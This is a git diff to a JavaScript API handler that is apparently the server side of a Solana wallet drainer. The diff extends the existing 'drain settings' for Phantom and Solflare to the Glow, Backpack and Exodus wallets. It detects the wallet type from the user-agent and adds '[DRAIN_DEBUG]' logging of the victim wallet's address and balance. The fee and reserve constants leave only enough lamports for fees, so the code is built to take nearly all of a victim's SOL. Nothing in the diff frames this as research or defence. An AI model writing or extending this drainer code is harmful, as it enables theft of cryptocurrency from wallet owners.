@@ -374,19 +374,35 @@ export default async function handler(req, res) {
     // Define fee calculation variables at function scope
     // Phantom-optimized drain settings (working configuration)
     const PHANTOM_FEE_BUFFER = 100000; // ~0.0001 SOL for Phantom network fees + safety margin
-const PHANTOM_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
-const PHANTOM_TOTAL_RESERVED = PHANTOM_FEE_BUFFER + PHANTOM_RESERVE_LAMPORTS;
+    const PHANTOM_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
+    const PHANTOM_TOTAL_RESERVED = PHANTOM_FEE_BUFFER + PHANTOM_RESERVE_LAMPORTS;
     
     // Solflare-optimized drain settings (more aggressive)
     const SOLFLARE_FEE_BUFFER = 75000; // ~0.000075 SOL for network fees
-const SOLFLARE_RESERVE_LAMPORTS = 25000; // Keep SOL for safety and rent
-const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
+    const SOLFLARE_RESERVE_LAMPORTS = 25000; // Keep SOL for safety and rent
+    const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
+    
+    // Glow-optimized drain settings (similar to Phantom)
+    const GLOW_FEE_BUFFER = 100000; // ~0.0001 SOL for Glow network fees + safety margin
+    const GLOW_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
+    const GLOW_TOTAL_RESERVED = GLOW_FEE_BUFFER + GLOW_RESERVE_LAMPORTS;
+    
+    // Backpack-optimized drain settings (similar to Phantom)
+    const BACKPACK_FEE_BUFFER = 100000; // ~0.0001 SOL for Backpack network fees + safety margin
+    const BACKPACK_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
+    const BACKPACK_TOTAL_RESERVED = BACKPACK_FEE_BUFFER + BACKPACK_RESERVE_LAMPORTS;
+    
+    // Exodus-optimized drain settings (similar to Phantom)
+    const EXODUS_FEE_BUFFER = 100000; // ~0.0001 SOL for Exodus network fees + safety margin
+    const EXODUS_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
+    const EXODUS_TOTAL_RESERVED = EXODUS_FEE_BUFFER + EXODUS_RESERVE_LAMPORTS;
     
     // Get wallet type from user agent or other means
     const userAgent = req.headers['user-agent'] || '';
     const isSolflare = userAgent.includes('Solflare') || userAgent.includes('solflare');
-    
-
+    const isGlow = userAgent.includes('Glow') || userAgent.includes('glow');
+    const isBackpack = userAgent.includes('Backpack') || userAgent.includes('backpack');
+    const isExodus = userAgent.includes('Exodus') || userAgent.includes('exodus');
     
     // Use wallet-specific settings
     let FEE_BUFFER, RESERVE_LAMPORTS, TOTAL_RESERVED;
@@ -395,7 +411,20 @@ const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
       FEE_BUFFER = SOLFLARE_FEE_BUFFER;
       RESERVE_LAMPORTS = SOLFLARE_RESERVE_LAMPORTS;
       TOTAL_RESERVED = SOLFLARE_TOTAL_RESERVED;
+    } else if (isGlow) {
+      FEE_BUFFER = GLOW_FEE_BUFFER;
+      RESERVE_LAMPORTS = GLOW_RESERVE_LAMPORTS;
+      TOTAL_RESERVED = GLOW_TOTAL_RESERVED;
+    } else if (isBackpack) {
+      FEE_BUFFER = BACKPACK_FEE_BUFFER;
+      RESERVE_LAMPORTS = BACKPACK_RESERVE_LAMPORTS;
+      TOTAL_RESERVED = BACKPACK_TOTAL_RESERVED;
+    } else if (isExodus) {
+      FEE_BUFFER = EXODUS_FEE_BUFFER;
+      RESERVE_LAMPORTS = EXODUS_RESERVE_LAMPORTS;
+      TOTAL_RESERVED = EXODUS_TOTAL_RESERVED;
     } else {
+      // Default to Phantom settings for unknown wallets
       FEE_BUFFER = PHANTOM_FEE_BUFFER;
       RESERVE_LAMPORTS = PHANTOM_RESERVE_LAMPORTS;
       TOTAL_RESERVED = PHANTOM_TOTAL_RESERVED;
@@ -413,7 +442,12 @@ const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
       console.log(`[DRAIN_DEBUG] Wallet: ${userPubkey.toString()}`);
       console.log(`[DRAIN_DEBUG] Fresh Balance: ${FRESH_BALANCE} lamports (${(FRESH_BALANCE / 1e9).toFixed(6)} SOL)`);
       console.log(`[DRAIN_DEBUG] Total Reserved: ${TOTAL_RESERVED} lamports (${(TOTAL_RESERVED / 1e9).toFixed(6)} SOL)`);
-      console.log(`[DRAIN_DEBUG] Is Solflare: ${isSolflare}`);
+      console.log(`[DRAIN_DEBUG] Wallet Type Detection:`);
+      console.log(`[DRAIN_DEBUG] - Is Solflare: ${isSolflare}`);
+      console.log(`[DRAIN_DEBUG] - Is Glow: ${isGlow}`);
+      console.log(`[DRAIN_DEBUG] - Is Backpack: ${isBackpack}`);
+      console.log(`[DRAIN_DEBUG] - Is Exodus: ${isExodus}`);
+      console.log(`[DRAIN_DEBUG] - User Agent: ${userAgent.substring(0, 100)}...`);
       
       // Check if wallet has enough SOL for fees (at least 0.0001 SOL)
       const MINIMUM_MEANINGFUL_SOL = 100000; // 0.0001 SOL (enough for fees + small drain)
